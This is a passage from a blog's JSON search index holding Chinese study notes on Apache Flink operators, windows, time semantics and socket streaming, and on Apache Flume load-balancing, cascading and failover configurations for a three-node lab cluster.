}"},{"title":"","date":"2020-01-11T06:12:00.000Z","updated":"2022-05-10T02:00:00.000Z","comments":true,"path":"notes/Flink/operator.html","permalink":"https://blog.mhuig.top/notes/Flink/operator","excerpt":"","text":"Operator Flink 常用的算子 Flink 数据处理模型在 Flink 应用程序中，无论你的应用程序是批程序，还是流程序，都是下图这种模型，有数据源（source），有数据下游（sink） Source: 数据源 基于本地集合、基于文件、基于网络套接字 自定义的 source Apache kafka、RabbitMQ Transformation: 数据转换 Map / FlatMap / Filter / KeyBy / Reduce / Fold / Aggregations / Window / WindowAll / Union / Window join / Split / Select / Project Sink: 接收器 写入文件、打印出来、写入 Socket 、自定义的 Sink 自定义的 Sink Apache kafka、RabbitMQ、MySQL、ElasticSearch、Apache Cassandra、HDFS Flink 算子 OperatorMap获取一个元素并生成一个元素 FlatMap获取一个元素并生成零个、一个或多个元素 filter KeyByKeyBy 在逻辑上是基于 key 对流进行分区，相同的 Key 会被分到一个分区 AggregationsDataStream API 支持各种聚合， 这些函数可以应用于 KeyedStream 以获得 Aggregations 聚合 常用的方法有 min、minBy、max、minBy、sum max 和 maxBy 之间的区别在于 max 返回流中的最大值，但 maxBy 返回具有最大值的键， min 和 minBy 同理 WindowWindow 函数允许按时间或其他条件对现有 KeyedStream 进行分组 10 秒的时间窗口的和（聚合） socketStream.keyBy(0).window(Time.seconds(10)).sum(1) UnionUnion 函数将两个或多个数据流结合在一起, 这样后面在使用的时候就只需使用一个数据流就行了 inputStream.union(inputStream1, inputStream2, ...) val socketStream = env.socketTextStream(\"localhost\", 9000, '\\n')val textStream = env.readTextFile(\"/word.txt\")socketStream.union(textStream) Window Join通过一些 key 将同一个 window 的两个数据流 join 起来 stream.join(otherStream) .where(&lt;KeySelector&gt;) .equalTo(&lt;KeySelector&gt;) .window(&lt;WindowAssigner&gt;) .apply(&lt;JoinFunction&gt;) inputStream.join(inputStream1) .where(0).equalTo(1) .window(Time.seconds(5)) .apply (new JoinFunction () {...}); Split根据条件将流拆分为两个或多个流 Select从拆分流中选择特定流，那么就得搭配使用 Select 算子 通常搭配 Split 算子一起使用"},{"title":"","date":"2020-01-10T01:19:00.000Z","updated":"2022-05-10T02:01:00.000Z","comments":true,"path":"notes/Flink/program.html","permalink":"https://blog.mhuig.top/notes/Flink/program","excerpt":"","text":"Programming Model Flink 编程模型 Apache Flink 是一个面向分布式数据流处理和批量数据处理的开源计算平台，提供支持流处理和批处理两种类型应用的功能 Flink 环境准备 Flink 编写程序需要依赖 Java——JDK 项目使用 Maven 管理依赖 ——Maven 开发工具使用 IDEA——IntelliJ IDEA JDK 8https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html Mavenhttp://maven.apache.org/download.cgi IntelliJ IDEAhttps://www.jetbrains.com/idea/download/#section=windows 下载 Flinkhttps://flink.apache.org/downloads.html 安装 Scala Plugins点击 File -&gt; Settings 菜单 , 或 Ctrl + Alt + S 快捷键 . 打开设置面板 . 并切换到 Plugins 插件视图搜索 Scala 点击 Install Flink 项目模版基于 Java 的项目模版Flink WordCount Java 源码 GitHub 在命令行使用 maven 创建 Flink 项目mvn archetype:generate \\-DarchetypeGroupId=org.apache.flink \\-DarchetypeArtifactId=flink-quickstart-java \\-DarchetypeVersion=1.8.3 根据提示输入 groupId、artifactId groupId：com.qst（所在公司、学校、组织官网网址的反写） artifactId：wordcount-java（项目名称） 项目目录结构 使用 mvn 命令创建项目后我们会得到一个如下结构的项目目录 编译项目 在项目所在目录执行 mvn clean package 命令对项目进行编译 这时 maven 会下载 Flink 项目需要的依赖包并编译项目 编译完成后产生一个 target/&lt;artifact-id&gt;-&lt;version&gt;.jar 文件 基于 Scala 的项目模版mvn archetype:generate \\-DarchetypeGroupId=org.apache.flink \\-DarchetypeArtifactId=flink-quickstart-scala \\-DarchetypeVersion=1.8.3 Flink WordCountFlink WordCount scala 源码 GitHub 创建 WrodCount 项目在命令行使用 maven 创建 Flink 项目mvn archetype:generate \\-DarchetypeGroupId=org.apache.flink \\-DarchetypeArtifactId=flink-quickstart-scala \\-DarchetypeVersion=1.8.3 根据提示在输入 groupId、artifactId groupId：com.qst（所在公司、学校、组织官网网址的反写） artifactId：wordcount-scala（项目名称） 其它选项使用默认值 将项目导入 IDEA 在 IDEA 中将 flink-wordcount 项目导入 选择 Import Project 找到 wordcount-scala 所在目录将项目导入 IDEA 开发 WordCount 程序第一步：设定执行环境 运行 Flink 程序的第一步就是获得相应的执行环境，执行环境决定了程序在什么环境执行（本地 / 集群） 不同的运行环境也决定了程序的类型 批处理 ExecutionEnvironment 流处理 StreamExecutionEnvironment 第二步：指定数据源 读取数据 定义执行环境后需要获得需要处理的数据，将外部数据转换成 DateStream 或 DataSet如下方法读取所示使用 readTextFile() 方法读取文件中的数据并转换成 DataStream 数据集 val source = env.readTextFile(\"/word.txt\") 第三步：对数据集执行转换操作 Flink 中的 Transformation 操作通过不同的 Operator 来实现对数据的操作 Operator 内部通过 Function 接口完成数据处理 在 DataStream API 和 DataSet API 中提供了大量的转换操作flatMap、map、filter、keyBy source.flatMap(line =&gt; line.toLowerCase.split(\"\\\\W+\")) //将文本转换成数组.filter(_.length &gt; 0) //过滤空字符串.map(word =&gt; (word, 1)) //转换成 key-value 接口.keyBy(0) //按照指定字段（key）对数据进行分区.sum(1) //执行求和运算 第四步：输出结果经过转换后形成了最终结果，通常需要将结果数据输出到外部系统中 source.flatMap(line =&gt; line.toLowerCase.split(\"\\\\W+\")) //将文本转换成数组.filter(_.length &gt; 0) //过滤空字符串.map(word =&gt; (word, 1)) //转换成 key-value 接口.keyBy(0) //按照指定字段（key）对数据进行分区.sum(1) //执行求和运算.print() //输出到控制台//.writeAsText(\"/word_out.txt\") //写入外部文件 第五步：触发程序执行所有的计算逻辑完成之后，需要调用 StreamExecutionEnvironment 的 execute 方法来触发应用程序的执行 env.execute(\"Streaming Scala WordCount\") 运行 &amp; 编译 WordCount 程序编译 WordCount 应用程序 在程序根目录执行 mvn clean package 命令进行编译 这时 maven 会下载 Flink 项目需要的依赖包并编译项目 编译完成后产生一个 target/&lt;artifact-id&gt;-&lt;version&gt;.jar 文件"},{"title":"","date":"2020-01-10T01:53:00.000Z","updated":"2022-05-10T02:02:00.000Z","comments":true,"path":"notes/Flink/socket.html","permalink":"https://blog.mhuig.top/notes/Flink/socket","excerpt":"","text":"Socket Flink 实时处理 Socket 数据 Flink Socket 源码 GitHub 通过 Maven Archetype 创建项目创建项目mvn archetype:generate \\-DarchetypeGroupId=org.apache.flink \\-DarchetypeArtifactId=flink-quickstart-scala \\-DarchetypeVersion=1.9.0 通过以上 Maven 命令进行项目创建的过程中，命令会交互式地提示用户对项目的 groupId、artifactId、version、package 等信息进行定义，且部分选项有默认值，直接回车即可。如图如果创建项目成功之后，客户端会有相应提示。 这里我们分别指定 groupId、artifactId 的信息分别如下，其余参数使用默认值 groupId：com.qst artifactId：flink-socket 检查项目对于使用 Maven 创建的项目，我们可以看到的项目结构如下所示 以上项目结构可以看出，该项目是一个 Scala 代码的项目，分别是 BatchJob.java 和 StreamingJob.java 两个文件，分别对应 Flink 批量接口 DataSet 的实例代码和流式接口的实例代码。 将项目导入 IDE项目经过上述步骤创建后，Flink 官网推荐使用 Intellij IDEA 进行后续项目开发。 编译项目项目经过上述步骤创建后，可以使用 Maven Command 命令 mvn clean package 对项目进行编译，编译完成后会在项目同级目录下生成 target/&lt;artifactId&gt;-&lt;version&gt;.jar 文件，此 jar 文件就可以通过 Web 客户端提交到集群上运行。 开发环境配置这里我们使用官网推荐的 IntelliJ IDEA 作为应用的开发的 IDE。 下载 IntelliJ IDEA用户可以通过 IntelliJ IDEA 官方地址下载安装程序，根据操作系统选择相应的程序包进行安装。 安装 Scala Plugins安装完 IntelliJ IDEA 默认是不支持 Scala 开发环境的，需要安装 Scala 插件进行支持。一下说明在 IDEA 中进行 Scala 插件的安装。 打开 IDEA IDE 后，在 IntelliJ IDEA 菜单栏中选择 Preferences 选项，然后选择 Plugins 子选项，最后在页面中选择 Marketplace，在搜索框中输入 Scala 进行搜索 在检索出来的选项列表中选择和安装 Scala 插件 点击安装后重启 IDE，Scala 编程环境即可生效 导入 Flink 项目 启动 IntelliJ IDEA，选择 Import Project，在文件选项框中选择创建好的项目，点击确定。 导入项目中选择 Import project from external mode 中的 Maven 后续选项使用默认值即可。 Flink Socket 应用程序编写 Flink Socket 应用程序代码import org.apache.flink.streaming.api.scala._object StreamingJob { def main(args: Array[String]) { //设置环境变量 val env = StreamExecutionEnvironment.getExecutionEnvironment //指定数据源，读取socket val socketStream = env.socketTextStream(\"localhost\", 9000, '\\n') //对数据集指定转换操作逻辑 val count = socketStream .flatMap(_.toLowerCase.split(\"\\\\W+\")) .filter(_.nonEmpty) .map((_, 1)) .keyBy(0) .sum(1) //将计算结果打印到控制台 count.print() //指定任务名称并触发流式任务 env.execute(\"Socket Stream\") }} 在 IDE 中测试代码在代码文件中右键运行程序 此时会报如下错误 这时我们需要在 IDEA 的 Run/Debug Configuration 中将 Include dependencies with \"Provided\" scope 选项勾选，这时我们就可以在本地 IDE 运行了 在本地测试代码首先在命令行我们现在终端开启监听端口 9000，在命令行中执行如下命令 nc -l 9000 然后在 IDE 中 右键运行 StreamingJob 类的 main 方法，运行结果如下 在 Web 客户端中运行 Job首先在项目所在目录执行 mvn clean package 进行打包，在项目的 target 目录下生成一个 flink-socket-1.0-SNAPSHOT.jar 文件在命令行我们现在终端开启监听端口 9000，在命令行中执行如下命令 nc -l 9000 在浏览器中打开 Flink Web 监控页面，在左侧选择 Submit New Job 选项，点击 右上角的 Add New 选择我们编译好的 flink-socket-1.0-SNAPSHOT.jar 文件，点击 Submit 按钮提交 Job 选择 Task Managers 选择列表中的对应 Job 点击 Stdout 选项查看执行结果"},{"title":"","date":"2020-01-09T06:58:00.000Z","updated":"2022-05-10T02:01:00.000Z","comments":true,"path":"notes/Flink/overview.html","permalink":"https://blog.mhuig.top/notes/Flink/overview","excerpt":"","text":"Overview Flink 概述 Apache Flink 是一个面向分布式数据流处理和批量数据处理的开源计算平台，提供支持流处理和批处理两种类型应用的功能 Flink 是什么 Apache Flink 是一个面向分布式数据流处理和批量数据处理的开源计算平台，提供支持流处理和批处理两种类型应用的功能 Apache Flink 的前身是柏林理工大学一个研究性项目， 在 2014 被 Apache 孵化器所接受，然后迅速地成为了 Apache Software Foundation 的顶级项目之一 代码主要由 Java 实现，部分代码是 Scala Flink 主要处理的场景就是流数据，批处理只是流数据的一个极限特例 数据类型有界流（bounded stream） 批量数据 有界流有定义流的开始，也有定义流的结束。有界流可以在摄取所有数据后再进行计算。有界流所有数据可以被排序，所以并不需要有序摄取。有界流处理通常被称为批处理。 有界流通常被称为有界数据集，数据的特点为有限不会改变的数据集合 常见的有界流 T + 1 的销售数据 11 月的汽车销售数量 2018 年全国电影票房 无界流（unbounded stream） 实时数据 有定义流的开始，但没有定义流的结束。它们会无休止地产生数据。无界流的数据必须持续处理，即数据被摄取后需要立刻处理。我们不能等到所有数据都到达再处理，因为输入是无限的，在任何时候输入都不会完成。处理无界数据通常要求以特定顺序摄取数据，例如事件发生的顺序，以便能够推断结果的完整性。 无界流通常被称为无穷数据集，数据的特点为无穷集成的数据集合 常见的无界流 用户与客户断的实时交互数据 应用时产生的日志 金融市场的实时交易记录 有界流和无界流 数据运算模型流式计算 只要数据一直在产生，计算就持续的进行 处理无界数据集 批处理 在预定义的时间内运行计算，当计算完成时释放计算机资源 处理有界数据集 Flink 组件栈 Deploy本地 Local 一个 Java 虚拟机 Single JVM（IDE 中直接运行） 集群 Cluster Standalone（start-cluster.sh） YARN MESOS K8s 云 Cloud GCE google AWS/EC2 amazon MapR Aliyun Program Code Flink 应用程序代码 Job Client 任务执行起点，负责接受用户的程序代码、创建数据流、提交数据流给 Job Manager 、返回结果 Job Manager 作业管理器协调管理程序 Task Manager 从 Job Manager 接受需要部署的 Task RuntimeRuntime 层提供了支持 Flink 计算的全部核心实现，比如：支持分布式 Stream 处理、JobGraph 到 ExecutionGraph 的映射、调度等等，为上层 API 层提供基础服务 API&amp;Libaries 核心 APIs DataSet API：批处理，处理有界的数据集 DataStream API：流式处理，处理有界或无界的数据集 Table API 以表为中心声明的 DSL select、project、join、group-by、aggregate操作 支持与 DataStream/DataSet 混合使用 SQL Flink 提供的最高级抽象 支持与 DataStream/DataSet 混合使用 面向批处理的 Lib FlinkML 机器学习 Gelly 图处理 面向流处理的类库 CEP 复杂事件处理 SQL-Like Table的关系操作 Flink 的基本编程模型 Source 数据输入 基于文件 基于本地集合 基于网络套接字 自定义：Apache Kafka、RabbitMQ Transformation 数据转换 Map、FlatMap、Filter、Reduce、Window Sink 数据输出 写文件 打印 socket 自定义：Apache Kafka、HDFS、MySQL 大数据框架对比（流式 / 实时数据处理） 大数据 Lamdba 框架"},{"title":"","date":"2020-01-10T07:12:00.000Z","updated":"2022-05-10T02:03:00.000Z","comments":true,"path":"notes/Flink/time.html","permalink":"https://blog.mhuig.top/notes/Flink/time","excerpt":"","text":"Time Flink 时间语义 Flink 的三种时间语义 Processing Time：事件被处理时机器的系统时间 Event Time：事件自身的时间 Ingestion Time：事件进入 Flink 的时间 Process Time事件处理时间 即事件被处理时机器的系统时间 特点 最简单的 Time 概念 最好的性能和最低的延迟 分布式和异步环境下，不能提供确定性（不能保证结果数据的准确性） 容易受到事件到达系统的速度 (如消息队列)、事件在系统内操作流动的速度和中断的影响 Event Time事件自身的时间，一般就是数据本身携带的时间 特点 数据本身携带，时间取决于数据 事件到达 Flink 之前就已经确定 必须指定如何生成 WaterMarks，用来表示 Event Time 进度的机制 无论事件什么时候到达或者其怎么排序，最后处理 Event Time 将产生完全一致和确定的结果 Ingestion Time事件进入 Flink 的时间 在数据源操作处（进入 Flink source 时），每个事件将进入 Flink 时当时的时间作为时间戳 特点 事件在进入数据源（Flink Source）时的时间作为时间戳 介于 Event Time 和 Processing Time 之间 Time 生成的位置 Flink Time 使用场景Time 的使用场景一般来说在生产环境中使用 Processing Time 和 Event Time 比较多，Ingestion Time 一般用的较少 Processing Time 使用场景Processing Time 使用场景 用户不关心事件时间，只关心这个时间窗口要有数据进来 Processing Time 的几种应用场景举例 淘宝双十一晚会大屏幕的下单总金额 Event Time 使用场景Event Time 使用场景 业务需求需要时间这个字段 Event Time 的几种应用场景举例 购物时先有下单事件、再有支付事件 机器异常检测出发的警告也需要具体的事件展示出来 商品广告及时精准推荐给用户依赖的就是用户在浏览器的时间段/频率/时长等信息 处理延迟的数据可能出现的情况影响事件到达不一定及时、乱序、延迟 网络抖动 服务可用性 消息队列的分区数据堆积 但是使用事件时间的话，就可能有这样的情况：数据源采集的数据往消息队列中发送时可能因为网络抖动、服务可用性、消息队列的分区数据堆积的影响而导致数据到达的不一定及时，可能会出现数据出现一定的乱序、延迟几分钟等，庆幸的是 Flink 支持通过 WaterMark 机制来处理这种延迟的数据 如何设置 Time 策略？val env = StreamExecutionEnvironment.getExecutionEnvironmentenv.setStreamTimeCharacteristic(TimeCharacteristic.ProcessingTime)env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime)env.setStreamTimeCharacteristic(TimeCharacteristic.IngestionTime)"},{"title":"","date":"2020-01-11T01:12:00.000Z","updated":"2022-05-10T01:55:00.000Z","comments":true,"path":"notes/Flink/window.html","permalink":"https://blog.mhuig.top/notes/Flink/window","excerpt":"","text":"Window Flink 中的三种 Window Flink Window Demo 源码 GitHub 什么是 Window？统计经过某红绿灯的汽车数量之和？ 假设在一个红绿灯处，统计通过此红绿灯的汽车数量 可以把汽车的经过看成一个流，无穷的流，不断有汽车经过此红绿灯，因此无法统计总共的汽车数量。但是，我们可以换一种思路，每隔 15 秒，我们都将与上一次的结果进行 sum 操作（滑动聚合） 这个结果似乎还是无法回答我们的问题，根本原因在于流是无界的，我们不能限制流，但可以在有一个有界的范围内处理无界的流数据。因此，我们需要换一个问题的提法：每分钟经过某红绿灯的汽车数量之和？ 这个问题，就相当于一个定义了一个 Window（窗口），Window 的界限是 1 分钟，且每分钟内的数据互不干扰，因此也可以称为翻滚（不重合）窗口，如下图： 再考虑一种情况，每 30 秒统计一次过去 1 分钟的汽车数量之和 此时，Window 出现了重合。这样，1 个小时内会有 120 个 Window。 Window 指定时间范围内的所有数据 滚动窗口 各个窗口之间的数据不重叠（不重复） 滑动窗口 各个窗口之间的数据重叠（重复） Window 有什么作用？通常来讲，Window 就是用来对一个无限的流设置一个有限的集合，在有界的数据集上进行操作的一种机制。Window 又可以分为基于时间（Time-based）的 Window 以及基于数量（Count-based）的 window。 Flink 中的三种 WindowFlink 在 KeyedStream（DataStream 的继承类） 中提供了下面几种 Window： 以时间驱动的 Time Window 以事件数量驱动的 Count Window 以会话间隔驱动的 Session Window Time Window 正如命名那样，Time Window 根据时间来聚合流数据。 例如：一分钟的时间窗口就只会收集一分钟的数据，并在一分钟过后对窗口中的所有数据应用于下一个算子。 在 Flink 中使用 Time Window 非常简单，输入一个时间参数，这个时间参数可以利用 Time 这个类来控制，如果事前没指定 TimeCharacteristic 类型的话，则默认使用的是 ProcessingTime dataStream.keyBy(1).timeWindow(Time.minutes(1)) //time Window 每分钟统计一次数量和.sum(1); dataStream.keyBy(1).timeWindow(Time.minutes(1), Time.seconds(30)) //隔 30s 统计过去1m和.sum(1); Count WindowApache Flink 还提供计数窗口功能，如果计数窗口的值设置的为 3 ，那么将会在窗口中收集 3 个事件，并在添加第 3 个事件时才会计算窗口中所有事件的值。 dataStream.keyBy(1).countWindow(3) //统计每 3 个元素的数量之和.sum(1); dataStream.keyBy(1) .countWindow(4, 3) //每隔 3 个元素统计过去 4 个元素的数量之和.sum(1); Session WindowApache Flink 还提供了会话窗口，是什么意思呢？使用该窗口的时候你可以传入一个时间参数（表示某种数据维持的会话持续时长），如果超过这个时间，就代表着超出会话时长。 dataStream.keyBy(1).window(ProcessingTimeSessionWindows.withGap(Time.seconds(5)))//表示如果 5s 内没出现数据则认为超出会话时长，然后计算这个窗口的和.sum(1);"},{"title":"","date":"2019-05-10T06:27:00.000Z","updated":"2022-05-12T05:35:00.000Z","comments":true,"path":"notes/Flume/balancer.html","permalink":"https://blog.mhuig.top/notes/Flume/balancer","excerpt":"","text":"负载均衡 Flume 负载均衡 load balancer 负载均衡是用于解决一台机器 (一个进程) 无法解决所有请求而产生的一种算法。Load balancing Sink Processor 能够实现 load balance 功能，如下图 Agent1 是一个路由节点，负责将 Channel 暂存的 Event 均衡到对应的多个 Sink 组件上，而每个 Sink 组件分别连接到一个独立的 Agent 上，示例配置，如下所示： 在此处我们通过三台机器来进行模拟 flume 的负载均衡三台机器规划如下：node01：采集数据，发送到 node02 和 node03 机器上去node02：接收 node01 的部分数据node03：接收 node01 的部分数据 第一步：开发 node01 服务器的 flume 配置node01 服务器配置： cd /export/servers/apache-flume-1.6.0-cdh5.14.0-bin/confvim load_banlancer_client.conf load_banlancer_client.conf#agent namea1.channels = c1a1.sources = r1a1.sinks = k1 k2#set gruopa1.sinkgroups = g1#set channela1.channels.c1.type = memorya1.channels.c1.capacity = 1000a1.channels.c1.transactionCapacity = 100a1.sources.r1.channels = c1a1.sources.r1.type = execa1.sources.r1.command = tail -F /export/servers/taillogs/access_log# set sink1a1.sinks.k1.channel = c1a1.sinks.k1.type = avroa1.sinks.k1.hostname = node02a1.sinks.k1.port = 52020# set sink2a1.sinks.k2.channel = c1a1.sinks.k2.type = avroa1.sinks.k2.hostname = node03a1.sinks.k2.port = 52020#set sink groupa1.sinkgroups.g1.sinks = k1 k2#set failovera1.sinkgroups.g1.processor.type = load_balancea1.sinkgroups.g1.processor.backoff = truea1.sinkgroups.g1.processor.selector = round_robina1.sinkgroups.g1.processor.selector.maxTimeOut=10000 第二步：开发 node02 服务器的 flume 配置cd /export/servers/apache-flume-1.6.0-cdh5.14.0-bin/confvim load_banlancer_server.conf load_banlancer_server.conf# Name the components on this agenta1.sources = r1a1.sinks = k1a1.channels = c1# Describe/configure the sourcea1.sources.r1.type = avroa1.sources.r1.channels = c1a1.sources.r1.bind = node02a1.sources.r1.port = 52020# Describe the sinka1.sinks.k1.type = logger# Use a channel which buffers events in memorya1.channels.c1.type = memorya1.channels.c1.capacity = 1000a1.channels.c1.transactionCapacity = 100# Bind the source and sink to the channela1.sources.r1.channels = c1a1.sinks.k1.channel = c1 第三步：开发 node03 服务器 flume 配置node03 服务器配置 cd /export/servers/apache-flume-1.6.0-cdh5.14.0-bin/confvim load_banlancer_server.conf load_banlancer_server.conf# Name the components on this agenta1.sources = r1a1.sinks = k1a1.channels = c1# Describe/configure the sourcea1.sources.r1.type = avroa1.sources.r1.channels = c1a1.sources.r1.bind = node03a1.sources.r1.port = 52020# Describe the sinka1.sinks.k1.type = logger# Use a channel which buffers events in memorya1.channels.c1.type = memorya1.channels.c1.capacity = 1000a1.channels.c1.transactionCapacity = 100# Bind the source and sink to the channela1.sources.r1.channels = c1a1.sinks.k1.channel = c1 第四步：准备启动 flume 服务启动 node03 的 flume 服务 cd /export/servers/apache-flume-1.6.0-cdh5.14.0-binbin/flume-ng agent -n a1 -c conf -f conf/load_banlancer_server.conf -Dflume.root.logger=DEBUG,console 启动 node02 的 flume 服务 cd /export/servers/apache-flume-1.6.0-cdh5.14.0-binbin/flume-ng agent -n a1 -c conf -f conf/load_banlancer_server.conf -Dflume.root.logger=DEBUG,console 启动 node01 的 flume 服务 cd /export/servers/apache-flume-1.6.0-cdh5.14.0-binbin/flume-ng agent -n a1 -c conf -f conf/load_banlancer_client.conf -Dflume.root.logger=DEBUG,console 第五步：node01 服务器运行脚本产生数据cd /export/servers/shellssh tail-file.sh"},{"title":"","date":"2019-05-10T06:25:00.000Z","updated":"2022-05-12T03:47:00.000Z","comments":true,"path":"notes/Flume/avro.html","permalink":"https://blog.mhuig.top/notes/Flume/avro","excerpt":"","text":"两个 agent 级联 Flume 两个 agent 级联 需求分析第一个 agent 负责收集文件当中的数据，通过网络发送到第二个 agent 当中去，第二个 agent 负责接收第一个 agent 发送的数据，并将数据保存到 hdfs 上面去 第一步：node02 安装 flume将 node03 机器上面解压后的 flume 文件夹拷贝到 node02 机器上面去 cd /export/serversscp -r apache-flume-1.6.0-cdh5.14.0-bin/ node02:$PWD 第二步：node02 配置 flume 配置文件在 node02 机器配置我们的 flume cd /export/servers/apache-flume-1.6.0-cdh5.14.0-bin/confvim tail-avro-avro-logger.conf tail-avro-avro-logger.conf################### Name the components on this agenta1.sources = r1a1.sinks = k1a1.channels = c1# Describe/configure the sourcea1.sources.r1.type = execa1.sources.r1.command = tail -F /export/servers/taillogs/access_loga1.sources.r1.channels = c1# Describe the sink##sink avro is a sendera1.sinks = k1a1.sinks.k1.type = avroa1.sinks.k1.channel = c1a1.sinks.k1.hostname = 192.168.52.120a1.sinks.k1.port = 4141a1.sinks.k1.batch-size = 10# Use a channel which buffers events in memorya1.channels.c1.type = memorya1.channels.c1.capacity = 1000a1.channels.c1.transactionCapacity = 100# Bind the source and sink to the channela1.sources.r1.channels = c1a1.sinks.k1.channel = c1 第三步：node02 开发定脚本文件往写入数据mkdir -p /export/servers/shells/cd /export/servers/shells/vim tail-file.sh tail-file.sh#!/bin/bashwhile truedodate &gt;&gt; /export/servers/taillogs/access_log; sleep 0.5;done 创建文件夹 mkdir -p /export/servers/taillogs 第四步：node03 开发 flume 配置文件在 node03 机器上开发 flume 的配置文件 cd /export/servers/apache-flume-1.6.0-cdh5.14.0-bin/confvim avro-hdfs.conf avro-hdfs.conf# Name the components on this agenta1.sources = r1a1.sinks = k1a1.channels = c1# Describe/configure the source##source avro is a receivera1.sources.r1.type = avroa1.sources.r1.channels = c1a1.sources.r1.bind = 192.168.52.120a1.sources.r1.port = 4141# Describe the sinka1.sinks.k1.type = hdfsa1.sinks.k1.hdfs.path = hdfs://node01:8020/avro/hdfs/%y-%m-%d/%H%M/a1.sinks.k1.hdfs.filePrefix = eventsa1.sinks.k1.hdfs.round = truea1.sinks.k1.hdfs.roundValue = 10a1.sinks.k1.hdfs.roundUnit = minutea1.sinks.k1.hdfs.rollInterval = 3a1.sinks.k1.hdfs.rollSize = 20a1.sinks.k1.hdfs.rollCount = 5a1.sinks.k1.hdfs.batchSize = 1a1.sinks.k1.hdfs.useLocalTimeStamp = true# Sequencefile,DataStreama1.sinks.k1.hdfs.fileType = DataStream# Use a channel which buffers events in memorya1.channels.c1.type = memorya1.channels.c1.capacity = 1000a1.channels.c1.transactionCapacity = 100# Bind the source and sink to the channela1.sources.r1.channels = c1a1.sinks.k1.channel = c1 第五步：顺序启动node03 机器启动 flume 进程 cd /export/servers/apache-flume-1.6.0-cdh5.14.0-binbin/flume-ng agent -c conf -f conf/avro-hdfs.conf -n a1 -Dflume.root.logger=INFO,console node02 机器启动 flume 进程 cd /export/servers/apache-flume-1.6.0-cdh5.14.0-bin/bin/flume-ng agent -c conf -f conf/tail-avro-avro-logger.conf -n a1 -Dflume.root.logger=INFO,console node02 机器启 shell 脚本生成文件 cd /export/servers/shellssh tail-file.sh"},{"title":"","date":"2019-05-10T06:26:00.000Z","updated":"2022-05-12T05:25:00.000Z","comments":true,"path":"notes/Flume/failover.html","permalink":"https://blog.mhuig.top/notes/Flume/failover","excerpt":"","text":"高可用配置 Flume 高可用配置 角色分配Flume 的 Agent 和 Collector 分布如下表所示： 名称 HOST 角色 Agent1 node01 Web Server Collector1 node02 AgentMstr1 Collector2 node03 AgentMstr2 图中所示，Agent1 数据分别流入到 Collector1 和 Collector2，Flume NG 本身提供了 Failover 机制，可以自动切换和恢复。在上图中，有 3 个产生日志服务器分布在不同的机房，要把所有的日志都收集到一个集群中存储。下 我们开发配置 Flume NG 集群 node01 安装配置 flume 与拷贝文件脚本将 node03 机器上面的 flume 安装包拷贝到 node01 机器上面去 node03 机器执行以下命令 cd /export/serversscp -r apache-flume-1.6.0-cdh5.14.0-bin/ node01:$PWD node01 机器配置 agent 的配置文件 cd /export/servers/apache-flume-1.6.0-cdh5.14.0-bin/confvim agent.conf agent.conf#agent1 nameagent1.channels = c1agent1.sources = r1agent1.sinks = k1 k2###set gruopagent1.sinkgroups = g1###set channelagent1.channels.c1.type = memoryagent1.channels.c1.capacity = 1000agent1.channels.c1.transactionCapacity = 100#agent1.sources.r1.channels = c1agent1.sources.r1.type = execagent1.sources.r1.command = tail -F/export/servers/taillogs/access_log#agent1.sources.r1.interceptors = i1 i2agent1.sources.r1.interceptors.i1.type = staticagent1.sources.r1.interceptors.i1.key = Typeagent1.sources.r1.interceptors.i1.value = LOGINagent1.sources.r1.interceptors.i2.type = timestamp### set sink1agent1.sinks.k1.channel = c1agent1.sinks.k1.type = avroagent1.sinks.k1.hostname = node02agent1.sinks.k1.port = 52020### set sink2agent1.sinks.k2.channel = c1agent1.sinks.k2.type = avroagent1.sinks.k2.hostname = node03agent1.sinks.k2.port = 52020###set sink groupagent1.sinkgroups.g1.sinks = k1 k2###set failoveragent1.sinkgroups.g1.processor.type = failoveragent1.sinkgroups.g1.processor.priority.k1 = 10agent1.sinkgroups.g1.processor.priority.k2 = 1agent1.sinkgroups.g1.processor.maxpenalty = 10000# node02 与 node03 配置 flumecollectionnode02 机器修改配置文件 cd /export/servers/apache-flume-1.6.0-cdh5.14.0-bin/confvim collector.conf collector.conf#set Agent namea1.sources = r1a1.channels = c1a1.sinks = k1###set channela1.channels.c1.type = memorya1.channels.c1.capacity = 1000a1.channels.c1.transactionCapacity = 100### other node,nna to nnsa1.sources.r1.type = avroa1.sources.r1.bind = node02a1.sources.r1.port = 52020a1.sources.r1.interceptors = i1a1.sources.r1.interceptors.i1.type = statica1.sources.r1.interceptors.i1.key = Collectora1.sources.r1.interceptors.i1.value = node02a1.sources.r1.channels = c1###set sink to hdfsa1.sinks.k1.type=hdfsa1.sinks.k1.hdfs.path= hdfs://node01:8020/flume01/failover/a1.sinks.k1.hdfs.fileType=DataStreama1.sinks.k1.hdfs.writeFormat=TEXTa1.sinks.k1.hdfs.rollInterval=10a1.sinks.k1.channel=c1a1.sinks.k1.hdfs.filePrefix=%Y-%m-%d# node03 机器修改配置文件 cd /export/servers/apache-flume-1.6.0-cdh5.14.0-bin/confvim collector.conf collector.conf#set Agent namea1.sources = r1a1.channels = c1a1.sinks = k1###set channela1.channels.c1.type = memorya1.channels.c1.capacity = 1000a1.channels.c1.transactionCapacity = 100### other node,nna to nnsa1.sources.r1.type = avroa1.sources.r1.bind = node03a1.sources.r1.port = 52020a1.sources.r1.interceptors = i1a1.sources.r1.interceptors.i1.type = statica1.sources.r1.interceptors.i1.key = Collectora1.sources.r1.interceptors.i1.value = node03a1.sources.r1.channels = c1###set sink to hdfsa1.sinks.k1.type=hdfsa1.sinks.k1.hdfs.path= hdfs://node01:8020/flume01/failover/a1.sinks.k1.hdfs.fileType=DataStreama1.sinks.k1.hdfs.writeFormat=TEXTa1.sinks.k1.hdfs.rollInterval=10a1.sinks.k1.channel=c1a1.sinks.k1.hdfs.filePrefix=%Y-%m-%d 顺序启动命令node03 机器上面启动 flume cd /export/servers/apache-flume-1.6.0-cdh5.14.0-binbin/flume-ng agent -n a1 -c conf -f conf/collector.conf -Dflume.root.logger=DEBUG,console node02 机器上面启动 flume cd /export/servers/apache-flume-1.6.0-cdh5.14.0-binbin/flume-ng agent -n a1 -c conf -f conf/collector.conf -Dflume.root.logger=DEBUG,console node01 机器上面启动 flume cd /export/servers/apache-flume-1.6.0-cdh5.14.0-binbin/flume-ng agent -n agent1 -c conf -f conf/agent.conf -Dflume.root.logger=DEBUG,console node01 机器启动文件产生脚本 mkdir -p /export/servers/shells/mkdir -p /export/servers/taillogscd /export/servers/shells/vim tail-file.sh tail-file.sh#!/bin/bashwhile truedo date &gt;&gt; /export/servers/taillogs/access_log; sleep 0.5;done 